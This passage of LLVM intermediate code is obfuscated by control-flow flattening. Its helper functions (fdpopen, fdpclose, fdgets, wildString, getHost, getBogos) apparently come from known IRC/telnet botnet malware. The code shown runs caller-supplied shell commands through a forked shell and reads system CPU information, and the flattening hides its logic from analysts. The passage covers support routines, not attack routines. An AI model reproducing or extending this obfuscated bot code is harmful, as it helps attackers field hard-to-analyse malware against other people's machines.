  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -1746472753, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8*, i8** %4, align 8
  %113 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.42, i32 0, i32 0), i8* %112, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

NewDefault:                                       ; preds = %loopEntry
  store i32 -572114977, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8*, i8** %5, align 8
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 114
  %119 = select i1 %118, i32 248660780, i32 -1137798215
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %122 = load i32, i32* %121, align 4
  store i32 %122, i32* %6, align 4
  %123 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @close(i32 %124)
  store i32 699273825, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %128 = load i32, i32* %127, align 4
  store i32 %128, i32* %6, align 4
  %129 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @close(i32 %130)
  store i32 699273825, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %9, align 4
  %134 = load i32*, i32** @fdopen_pids, align 8
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %134, i64 %136
  store i32 %133, i32* %137, align 4
  %138 = load i32, i32* %6, align 4
  store i32 %138, i32* %3, align 4
  store i32 -27347873, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %3, align 4
  ret i32 %140

loopEnd:                                          ; preds = %132, %126, %120, %114, %NewDefault, %107, %100, %95, %91, %84, %79, %73, %66, %LeafBlock, %LeafBlock1, %NodeBlock, %61, %55, %54, %44, %43, %39, %35, %34, %29, %28, %21, %15, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %.reg2mem = alloca i32*
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  store i32* %10, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 1196727487, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1196727487, label %first
    i32 760662629, label %13
    i32 -868106560, label %21
    i32 -1120272486, label %22
    i32 -2094356180, label %30
    i32 -27488, label %37
    i32 -1550215108, label %41
    i32 -294801360, label %45
    i32 -1298214063, label %47
    i32 33933829, label %56
    i32 934560755, label %57
    i32 374069414, label %64
    i32 -1823307455, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %11 = icmp eq i32* %.reload, null
  %12 = select i1 %11, i32 -868106560, i32 760662629
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = load i32, i32* %3, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i32, i32* %14, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = icmp eq i32 %18, 0
  %20 = select i1 %19, i32 -868106560, i32 -1120272486
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 -1823307455, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %3, align 4
  %24 = call i32 @close(i32 %23)
  %25 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %27 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %28 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %29 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  store i32 -2094356180, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32*, i32** @fdopen_pids, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i32, i32* %31, i64 %33
  %35 = load i32, i32* %34, align 4
  %36 = call i32 @waitpid(i32 %35, i32* %7, i32 0)
  store i32 %36, i32* %8, align 4
  store i32 -27488, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, -1
  %40 = select i1 %39, i32 -1550215108, i32 -294801360
  store i32 %40, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32* @__errno_location() #13
  %43 = load i32, i32* %42, align 4
  %44 = icmp eq i32 %43, 4
  store i32 -294801360, i32* %switchVar
  store i1 %44, i1* %.reg2mem2
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %46 = select i1 %.reload3, i32 -2094356180, i32 -1298214063
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  store i32 0, i32* %52, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  %55 = select i1 %54, i32 33933829, i32 934560755
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 374069414, i32* %switchVar
  store i32 -1, i32* %.reg2mem4
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast %struct.in_addr* %9 to i32*
  %59 = load i32, i32* %7, align 4
  store i32 %59, i32* %58, align 4
  %60 = bitcast %struct.in_addr* %9 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = and i32 %61, 65280
  %63 = ashr i32 %62, 8
  store i32 374069414, i32* %switchVar
  store i32 %63, i32* %.reg2mem4
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %2, align 4
  store i32 -1823307455, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  ret i32 %66

loopEnd:                                          ; preds = %64, %57, %56, %47, %45, %41, %37, %30, %22, %21, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -1283717223, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1283717223, label %9
    i32 526477042, label %13
    i32 -2054035018, label %18
    i32 1884008393, label %27
    i32 -1305574266, label %29
    i32 -1123997690, label %39
    i32 -499328160, label %43
    i32 812179884, label %44
    i32 -1468076467, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 526477042, i32 1884008393
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 -2054035018, i32 1884008393
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 1884008393, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 -1305574266, i32 -1123997690
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 -1283717223, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 -499328160, i32 812179884
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1468076467, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 -1468076467, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  %switchVar = alloca i32
  store i32 1636289554, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1636289554, label %4
    i32 -481062740, label %10
    i32 65437000, label %13
    i32 -161491549, label %15
    i32 -850947957, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  %9 = select i1 %8, i32 -481062740, i32 65437000
  store i32 %9, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i64, i64* %3, align 8
  %12 = icmp sge i64 %11, 0
  store i32 65437000, i32* %switchVar
  store i1 %12, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %14 = select i1 %.reload, i32 -161491549, i32 -850947957
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i64, i64* %3, align 8
  %17 = shl i64 %16, 4
  %18 = load i8*, i8** %2, align 8
  %19 = getelementptr inbounds i8, i8* %18, i32 1
  store i8* %19, i8** %2, align 8
  %20 = load i8, i8* %18, align 1
  %21 = zext i8 %20 to i64
  %22 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %21
  %23 = load i64, i64* %22, align 8
  %24 = or i64 %17, %23
  store i64 %24, i64* %3, align 8
  store i32 1636289554, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i64, i64* %3, align 8
  ret i64 %26

loopEnd:                                          ; preds = %15, %13, %10, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -574446463, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 -574446463, label %NodeBlock5
    i32 -436640354, label %NodeBlock
    i32 240642235, label %LeafBlock3
    i32 -1550105137, label %LeafBlock1
    i32 566008443, label %LeafBlock
    i32 -740852320, label %14
    i32 -1543677357, label %18
    i32 -1942634286, label %25
    i32 -1896639275, label %31
    i32 1689132378, label %38
    i32 -979639992, label %39
    i32 -551955065, label %42
    i32 954660588, label %48
    i32 1365781255, label %56
    i32 -1153923037, label %NewDefault
    i32 1141341974, label %59
    i32 -1107038372, label %70
    i32 877279914, label %78
    i32 -1176584233, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 566008443, i32 -436640354
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 -1550105137, i32 240642235
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 -551955065, i32 -1153923037
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 -1543677357, i32 -1153923037
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 -740852320, i32 -1153923037
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 -1176584233, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 -1942634286, i32 -979639992
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 -1896639275, i32 1689132378
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 1689132378, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 -979639992, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 -1176584233, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 954660588, i32 1365781255
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 1365781255, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 -1176584233, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1141341974, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #10
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #10
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 -1107038372, i32 877279914
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 877279914, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 -1176584233, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1302769420, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1302769420, label %first
    i32 -380303373, label %13
    i32 1940863482, label %14
    i32 15988113, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 -380303373, i32 1940863482
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 15988113, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 15988113, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %switchVar = alloca i32
  store i32 -292447994, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -292447994, label %3
    i32 805591723, label %8
    i32 210986813, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  %7 = select i1 %6, i32 805591723, i32 210986813
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8*, i8** %2, align 8
  %10 = load i8, i8* %9, align 1
  %11 = zext i8 %10 to i32
  %12 = call i32 @toupper(i32 %11) #10
  %13 = trunc i32 %12 to i8
  %14 = load i8*, i8** %2, align 8
  store i8 %13, i8* %14, align 1
  %15 = load i8*, i8** %2, align 8
  %16 = getelementptr inbounds i8, i8* %15, i32 1
  store i8* %16, i8** %2, align 8
  store i32 -292447994, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %8, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  %switchVar = alloca i32
  store i32 865265828, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 865265828, label %8
    i32 -1621513846, label %14
    i32 281200409, label %21
    i32 -670786592, label %24
    i32 1572221642, label %30
    i32 -1265271050, label %36
    i32 545799214, label %41
    i32 646208986, label %43
    i32 -287606799, label %46
    i32 1066868779, label %47
    i32 208622451, label %57
    i32 760075722, label %66
    i32 -1278640748, label %68
    i32 1365683153, label %74
    i32 -792561189, label %79
    i32 -1372087499, label %82
    i32 534615844, label %88
    i32 1666100121, label %90
    i32 733934330, label %93
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  %13 = select i1 %12, i32 -1621513846, i32 1666100121
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %15)
  %16 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %17 = call i8* @strstr(i8* %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0)) #10
  %18 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %19 = icmp eq i8* %17, %18
  %20 = select i1 %19, i32 281200409, i32 534615844
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %23 = getelementptr inbounds i8, i8* %22, i64 8
  store i8* %23, i8** %6, align 8
  store i32 -670786592, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %6, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 32
  %29 = select i1 %28, i32 545799214, i32 1572221642
  store i32 %29, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i8*, i8** %6, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 9
  %35 = select i1 %34, i32 545799214, i32 -1265271050
  store i32 %35, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8*, i8** %6, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 58
  store i32 545799214, i32* %switchVar
  store i1 %40, i1* %.reg2mem
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %42 = select i1 %.reload, i32 646208986, i32 -287606799
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8*, i8** %6, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** %6, align 8
  store i32 -670786592, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1066868779, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %6, align 8
  %49 = load i8*, i8** %6, align 8
  %50 = call i64 @strlen(i8* %49) #10
  %51 = sub i64 %50, 1
  %52 = getelementptr inbounds i8, i8* %48, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 13
  %56 = select i1 %55, i32 760075722, i32 208622451
  store i32 %56, i32* %switchVar
  store i1 true, i1* %.reg2mem2
